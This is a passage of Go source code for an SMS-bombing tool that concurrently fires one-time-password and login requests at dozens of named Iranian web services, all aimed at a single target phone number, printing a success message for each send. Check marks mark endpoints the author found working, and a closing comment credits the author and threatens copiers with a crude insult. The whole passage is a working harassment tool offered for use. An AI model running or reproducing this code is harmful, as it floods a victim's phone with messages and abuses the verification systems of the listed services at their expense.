				formData.Set("domain", "nobat")
				sendFormRequest(c, ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch) 
			}
		}(client) 

		// snapp.market  ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("cellphone", phone)
				urlWithQuery := "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + phone
				sendFormRequest(c, ctx, urlWithQuery, formData, &wg, ch) 
			}
		}(client) 

		// snapp.market(JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
					"cellphone": phone,
				}, &wg, ch)
			}
		}(client)

		// sabziman.com ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "newphoneexist")
				formData.Set("phonenumber", phone)
				sendFormRequest(c, ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client)

		// api.achareh.co ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"phone": "98" + phone[1:],
				}
				urlWithQuery := "https://api.achareh.co/v2/accounts/login/?web=true"
				sendJSONRequest(c, ctx, urlWithQuery, payload, &wg, ch) 
			}
		}(client) 

		// ghasedak24.com (Form) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				sendFormRequest(c, ctx, "https://ghasedak24.com/user/otp", formData, &wg, ch) 
			}
		}(client)

		// api6.arshiyaniha.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{ 
					"cellphone":    phone,
					"country_code": "98",
				}, &wg, ch)
			}
		}(client) 

		// bigtoys.ir - Variation 3 (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action_type", "phone")
				formData.Set("digt_countrycode", "+98")
				formData.Set("phone", strings.TrimPrefix(phone, "0"))
				formData.Set("email", "")
				formData.Set("digits_reg_name", "abcdefghl")
				formData.Set("digits_reg_password", "qzF8w7UAZusAJdg")
				formData.Set("digits_process_register", "1")
				formData.Set("optional_email", "")
				formData.Set("is_digits_optional_data", "1")
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1")
				formData.Set("signup_otp_mode", "1")
				formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
				formData.Set("optional_data", "email")
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("dig_otp", "")
				formData.Set("digits", "1")
				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
				formData.Set("digits_form", "3bed3c0f10")
				formData.Set("_wp_http_referer", "/")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				sendFormRequest(c, ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// mamifood.org - SendValidationCode (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{ 
					"Phone": phone,
					"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791",
				}, &wg, ch)
			}
		}(client) 

		// platform-api.snapptrip.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
					"phoneNumber": phone,
				}, &wg, ch)
			}
		}(client) 

		// okala.com - OTPRegister (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{ 
					"mobile":                   phone,
					"confirmTerms":             true,
					"notRobot":                 false,
					"ValidationCodeCreateReason": 5,
					"OtpApp":                   0,
					"IsAppOnly":                false,
					"deviceTypeCode":           7,
				}, &wg, ch)
			}
		}(client) 

		// see5.net (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("name", "sfsfsfsffsf")
				formData.Set("demo", "bz_sh_fzltprxh")
				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
			}
		}(client) 

		// itmall.ir (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone)
				formData.Set("csrf", "e57d035242")
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "")
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// api.mootanroo.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{ 
					"PhoneNumber": phone,
				}, &wg, ch)
			}
		}(client) 

		// accounts.khanoumi.com (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
				formData.Set("loginIdentifier", phone)
				formData.Set("loginSchemeName", "sms")
				sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch) 
			}
		}(client) 

		// virgool.io (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
					"method":     "phone",
					"identifier": phone,
				}, &wg, ch)
			}
		}(client) 

		// virgool.io (JSON) 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{ 
					"username": phone,
				}, &wg, ch)
			}
		}(client)

		// virgool.io (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{ 
					"identifier": phone,
				}, &wg, ch)
			}
		}(client)

		// digistyle.com (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("loginRegister[email_phone]", phone)
				sendFormRequest(c, ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch) 
			}
		}(client) 
		// sandbox.sibbazar.com (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{ 
					"username": phone,
				}, &wg, ch)
			}
		}(client) 

		// core.gapfilm.ir (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{ 
					"PhoneNo": phone,
				}, &wg, ch)
			}
		}(client) 

		// api.pindo.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

		// divar.ir (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// shab.ir login-otp (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// shab.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{ 
					"mobile":       phone,
					"country_code": "+98",
				}, &wg, ch)
			}
		}(client) 

		// Mobinnet (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch) 
			}
		}(client)

		// api.ostadkr.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// digikalajet.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// iranicard.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// alopeyk.com (JSON) 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

		// alopeyk.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// pinket.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{ 
					"phoneNumber": phone,
				}, &wg, ch)
			}
		}(client)

		// otaghak.com (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{ 
					"username": phone,
				}, &wg, ch)
			}
		}(client)

		// banimode.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// gw.jabama.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// jabama.com (JSON) - taraazws
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// torobpay.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{ 
					"phone_number": phone,
				}, &wg, ch)
			}
		}(client) 

		// sheypoor.com (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{ 
					"username": phone,
				}, &wg, ch)
			}
		}(client) 

		// miare.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{ 
					"phone_number": phone,
				}, &wg, ch)
			}
		}(client)

		// pezeshket.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
					"mobileNumber": phone,
				}, &wg, ch)
			}
		}(client)

		// classino.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

// az in 4 ta 2 tashon ehtemalan dorost bashan...
		// snapp.taxi (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
					"cellphone": phone,
				}, &wg, ch)
			}
		}(client) 

		// api.snapp.ir (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

		// digitalsignup.snapp.ir ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ 
					"cellphone": phone,
				}, &wg, ch)
			}
		}(client) 

		// digitalsignup.snapp.ir (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
					"cellphone": phone,
				}, &wg, ch)
			}
		}(client)

		// digikala.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{ 
					"username": phone,
				}, &wg, ch)
			}
		}(client)

		// ponisha.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// bitycle.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

		// barghman (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// komodaa.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{ 
					"phone_number": phone,
				}, &wg, ch)
			}
		}(client)
		// anargift.com auth (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// anargift.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// Snappfood (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("cellphone", phone)
				sendFormRequest(c, ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch) 
			}
		}(client) 

		// khodro45.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{ 
					"mobile":      phone,
					"device_type": 2,
				}, &wg, ch)
			}
		}(client) 


		// basalam.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// digikalajet.ir (JSON) 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// caropex.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// tetherland.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// tandori.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
/* coded by @monsmain
⚠️note: copy mamnoe.
❌befahmam copy kardi khahareto migam...*/
